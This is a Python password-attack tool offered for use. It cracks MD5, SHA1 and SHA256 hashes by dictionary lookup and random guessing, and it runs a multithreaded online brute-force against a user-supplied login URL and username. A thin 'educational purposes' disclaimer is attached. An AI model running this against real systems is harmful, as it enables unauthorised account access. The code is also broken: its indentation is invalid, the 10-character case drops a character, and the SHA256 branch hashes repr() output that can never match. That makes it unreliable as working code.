import hashlib
import random
import string
import time
import requests
import random
from threading import Thread
import os

start = time.time()
CharLength = 1
counter = 1

letters = string.ascii_letters
numbs = string.digits
punc = string.punctuation

let_numbs = letters + numbs
let_punc = letters + punc
numbs_punc = numbs + punc
all_characters = letters + numbs + punc
print('''
      ==========================================WELCOME TO MULTI-ATTACK=============================================================
      Author:Ntloyiya Okuhle
      Language:Python3                      =====  ====      =======
      Email:blessing.ntloyiya@gmail.com     === === ===  --  == = ==
      Site:okuhlentloyiya.com               ===     ===      ==   ==
      
      *Note* This tools is made for educational purposes, if you are caught doing illegal actions with it I will not be responsible.
      ==============================================================================================================================
      \n\n''')

hash = str(input("Enter the password hash: "))

type_of_attack = int(input("\nWhat type of attack do you want to do?\n\n"
                           "1. Dictionary Attack\n"
                           "2. Brute Force Attack\n"
                           "3. Random Login Attack\n\n"
                           "Enter your choice: "))
disc_list = []

try:
      if type_of_attack == 1:
    print("\nCracking......./")
    dictionary_file = open("Passwords.txt", errors="ignore")
    content = dictionary_file.readlines()
    for word in content:
        new_word = word.replace("\n", "")
        disc_list.append(new_word)
    for i in disc_list:
    
        
        if len(hash) == 32:
            disc_hash = hashlib.md5(i.encode("utf-8")).hexdigest()
        elif len(hash) == 40:
            disc_hash = hashlib.sha1(i.encode("utf-8")).hexdigest()
        elif len(hash) == 64:
            disc_hash = hashlib.sha256(i.encode("utf-8")).hexdigest()
        if disc_hash == hash:
            time.sleep(0.5)
            print("\n \n")
            print("Trying password.....")
            end = time.time()
            timetaken = end - start
            print("\n \n")
            print("Found it in ", timetaken, " seconds")
            print("\nPassword found! ", i)
            break
        if disc_hash != hash and disc_list.index(i) == len(disc_list) - 1:
            print("Password not found!")
            break


if type_of_attack == 2:
    type_of_characters = int(input("\nWhat type of characters do you want to try?\n\n"
                                   "1. All character\n"
                                   "2.Only letters\n"
                                   "3. Letters and numbers\n"
                                   "4.Letters and Punctuactions\n"
                                   "5. Numbers and punctuations\n"
                                   "6. Numbers only"
                                   "\n"
                                   "Enter your choice here: "))
    if type_of_characters == 1:
        choice_of_char = all_characters
    elif type_of_characters == 2:
        choice_of_char = letters
    elif type_of_characters == 3:
        choice_of_char = let_numbs
    elif type_of_characters == 4:
        choice_of_char = let_punc
    elif type_of_characters == 5:
        choice_of_char = numbs_punc
    elif type_of_characters == 6:
        choice_of_char = numbs

    generated_hash = 0
    gen_str = 0

    numb_of_char = int(input("\nHow many characters do you want to try: "))
    print("\nCraking..../\n")

    while hash != generated_hash:
        time.sleep(0.5)
        first = random.choice(choice_of_char)
        second = random.choice(choice_of_char)
        third = random.choice(choice_of_char)
        fourth = random.choice(choice_of_char)
        fifth = random.choice(choice_of_char)
        sixth = random.choice(choice_of_char)
        seventh = random.choice(choice_of_char)
        Eighth = random.choice(choice_of_char)
        Ninethy = random.choice(choice_of_char)
        Tenth = random.choice(choice_of_char)

        if numb_of_char == 1:
            gen_str = first
        elif numb_of_char == 2:
            gen_str = first + second
        elif numb_of_char == 3:
            gen_str = first + second + third
        elif numb_of_char == 4:
            gen_str = first + second + third + fourth
        elif numb_of_char == 5:
            gen_str = first + second + third + fourth + fifth
        elif numb_of_char == 6:
            gen_str = first + second + third + fourth + fifth +sixth
        elif numb_of_char == 7:
            gen_str = first + second + third + fourth + fifth +sixth + seventh
        elif numb_of_char == 8:
            gen_str = first + second + third + fourth + fifth +sixth + seventh + Eighth

        elif numb_of_char == 9:
            gen_str = first + second + third + fourth + fifth +sixth + seventh + Eighth + Ninethy

        elif numb_of_char == 10:
            gen_str = first + second + third + fourth + fifth +sixth + seventh + Eighth + Tenth

        counter += 1

        # This prints three blank lines.
        print("\n \n")

        # These print information for the user on the progress of the crack.
        #print("Similar Password: "+ gen_str )
        print("We are currently at ", (counter / (time.time() - start)), "attempts per seconds")
        print("It has been ", time.time() - start, " seconds!")
        print("We have tried ", counter, " possible passwords!")
        print("trying.......... " + str(gen_str))


        if len(hash) == 32:
            generated_hash = hashlib.md5(gen_str.encode("utf-8")).hexdigest()
        elif len(hash) == 40:
            generated_hash = hashlib.sha1(gen_str.encode("utf-8")).hexdigest()
        elif len(hash) == 64:
            generated_hash = hashlib.sha256(repr(gen_str).encode("utf-8")).hexdigest()

        if hash == generated_hash:
                # This takes the time at which the program finished.
            end = time.time()

                # This works out the time it took to find the password.
            timetaken = end - start
            #print the password found!

            print("\n \n")
            print(f"Password found! {gen_str}")
                # This tells the user how long it took to find the password as well as how many attempts it took.
            print("\n \n")
            print("Found it in ", timetaken, " seconds and ", counter, " attempts")

                # This tells the user how many attempst were made per second.
            print("That is ", counter / timetaken, " attempts per second!")


            break

if type_of_attack == 3:
    url = input("Enter the Target url: ")
    username = input("Enter the Target Username: ")


    def send_request(username, password):
        data = {
            "username": username,
            "password": password
        }

        r = requests.get(url, data=data)
        return r


    chars = "abcdefghijklmnopqrstuvwxyz0123456789"

    print(" \n Random password attacking starting..")
    def main():
        time.sleep(0.5)
        while True:
            if "correct_pass.txt" in os.listdir():
                break
            valid = False
            while not valid:
                rndpasswd = random.choices(chars, k=2)
                passwd = "".join(rndpasswd)
                file = open("Passwords.txt", 'r')
                tries = file.read()
                file.close()
                if passwd in tries:
                    pass
                else:
                    valid = True

            r = send_request(username, passwd)
            print("...............Requesting Access..........")
            print("This may take sometime.....")
            if 'failed to login' in r.text.lower():
                with open("Passwords.txt", "a") as f:
                    f.write(f"{passwd}\n")
                    f.close()
                print(f"Incorrect {passwd}\n")
            else:
                print(f"Correct Password {passwd}!\n")
                with open("correct_pass.txt", "w") as f:
                    f.write(passwd)
                break


    for x in range(20):
        Thread(target=main).start()
            
       
except:
      print('Either we are unable to crack the password or you did not enter your hash')
